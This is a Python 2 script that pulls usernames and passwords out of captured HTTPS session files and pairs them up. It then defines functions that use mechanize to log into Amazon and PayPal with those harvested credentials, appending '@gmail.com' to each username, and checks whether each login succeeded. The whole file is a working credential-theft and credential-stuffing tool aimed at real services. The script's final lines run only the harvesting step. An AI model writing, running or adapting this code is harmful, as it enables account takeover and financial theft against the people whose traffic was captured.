import os, mechanize, re, socket, netifaces, getopt, sys

directory='./HTTPS/'            #directory to find HTTPS sessions
uLabel=['username=', 'user=']   #list of label of username field
pLabel=['password=', 'pass=']   #list of label of password field
endChar=['&','\n']              #expected end characters of fields

                                #scan all valid files in HTTPS directory 
                                #looking for username and password labels
                                #if labels are found, add file to workList
                                #outputs list of intersting file names
def createWorkList():                   
    global directory                    
    global uLabel                       
    global pLabel                       
    
    workList=[]
    
    for validFile in (os.listdir(directory)):
        currentScanFile=directory+validFile
        with open(currentScanFile, 'r') as fileContents:
            data=fileContents.read()
            i=0
            j=0
            uCheck=re.search(uLabel[i], data)
            pCheck=re.search(pLabel[j], data)
            if(uCheck and pCheck):
                workList.append(validFile)
            elif(uCheck and pCheck is None):
                j=j+1
                pCheck=re.search(pLabel[j], data)
                if(pCheck):
                    workList.append(validFile)
            elif(pCheck and uCheck is None):
                i=i+1
                uCheck=re.search(uLabel[i], data)
                if(uCheck):
                    workList.append(validFile)
    return workList

                                #run loop for each file in the worklist
                                #find username label and end character 
                                #username is text between the each index
                                #outputs list of usernames
def createUsernameList(wl):
    global uLabel
    global endChar
    
    usernameList=[]
    
    i=0
    while(i<len(wl)):
        currentScanFile=directory+wl[i]
        with open(currentScanFile, 'r') as fileContents:
            data=fileContents.read()
            for j in range(2):
                k=0
                uStartCheck=re.search(uLabel[j], data)          
                if(uStartCheck):
                    uStart=data.index(uLabel[j])+len(uLabel[j])
                    uEndCheck=re.search(endChar[k], data)
                    if(uEndCheck):
                        uEnd=data.find(endChar[k], uStart)
                        username=data[uStart:uEnd]
                        usernameList.append(username)

                    else:
                        k=k+1
                        uEndCheck=re.search(endChar[k], data)
                        uEnd=data.find(endChar[k], uStart)
                        username=data[uStart:uEnd]
                        usernameList.append(username)                   
        i=i+1
    return usernameList

    
                                #run loop for each file in the worklist
                                #find password label and end character 
                                #password is text between the each index
                                #outputs list of passwords
def createPasswordList(wl):
    global pLabel
    global endChar
    
    passwordList=[]
    
    i=0
    while(i<len(wl)):
        currentScanFile=directory+wl[i]
        with open(currentScanFile, 'r') as fileContents:
            data=fileContents.read()
            for j in range(2):
                k=0
                pStartCheck=re.search(pLabel[j], data)         
                if(pStartCheck):
                    pStart=data.index(pLabel[j])+len(pLabel[j])
                    pEnd=data.find(endChar[k],pStart,pStart+30)
                    if(pEnd is not -1):
                        password=data[pStart:pEnd]
                        passwordList.append(password)

                    else:
                        k=k+1
                        pEnd=data.find(endChar[k],pStart,pStart+30)
                        if(pEnd is not -1):
                            password=data[pStart:pEnd]
                            passwordList.append(password)                
        i=i+1
    return passwordList

                                #combine username and passwords into list
                                #list is combination of username, password
                                #outputs list of username password pairs
def createCredentialPairList(ul,pl):
    credPairList=[]
    i=0
    while(i<len(ul)):
        credPairList.append([ul[i],pl[i]])
        i=i+1
    return credPairList

                                #navigates to Amazon and loads login form
                                #appends email address domain to username  ***add function to append multiple domains***
                                #attempts to login using credential pairs
                                #navigates to private page and prints title
                                #sign out to ready browser for next login
                                #prints details of success or failed login
def amazon(cpl):
    i=0
    while(i<len(cpl)):
        br=mechanize.Browser()  
        br.set_handle_robots(False)  
        br.addheaders=[('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13')]  
   
        sign_in=br.open('https://www.amazon.com/gp/sign-in.html')  
        br.select_form(name='signIn')  
        br['email']=cpl[i][0] + '@gmail.com' #domain name manually appended to usernames
        br['password']=cpl[i][1]
        logged_in=br.submit() 
        br.open('https://www.amazon.com/gp/css/order-history/ref=nav_youraccount_orders')
        private_check=br.title()
        br.open('https://www.amazon.com/gp/flex/sign-out.html/ref=nav_youraccount_signout')
        sign_out_check=br.title()
        if(private_check!='Amazon.com Sign In'):
            print 'AMAZON'
        else:
            print 'TRY OTHER CREDENTIALS'
        i=i+1

                                #navigates to Amazon and loads login form
                                #appends email address domain to username  ***add function to append multiple domains***
                                #attempts to login using credential pairs
                                #navigates to private page and prints title
                                #sign out to ready browser for next login
                                #prints details of success or failed login
def paypal(cpl):
    i=0
    while(i<len(cpl)):
        br=mechanize.Browser()  
        br.set_handle_robots(True)  
        br.addheaders=[('User-agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36')]  
        sign_in=br.open('https://www.paypal.com/signin/')  
        br.select_form(name='login')  
        br['login_email']=cpl[i][0] + '@gmail.com'
        br['login_password']=cpl[i][1]
        logged_in=br.submit() 
        br.open('https://www.paypal.com/myaccount/')
        print br.title()
        private_check=br.title()
        if(private_check=='https://www.paypal.com/myaccount/'):
            print 'PAYPAL'
        else:
            print 'TRY OTHER CREDENTIALS'
        br.open('https://www.paypal.com/myaccount/logout')
        sign_out_check=br.title()
        
        i=i+1
        
wl=createWorkList()
ul=createUsernameList(wl)
pl=createPasswordList(wl)
cpl=createCredentialPairList(ul,pl)
print cpl
print wl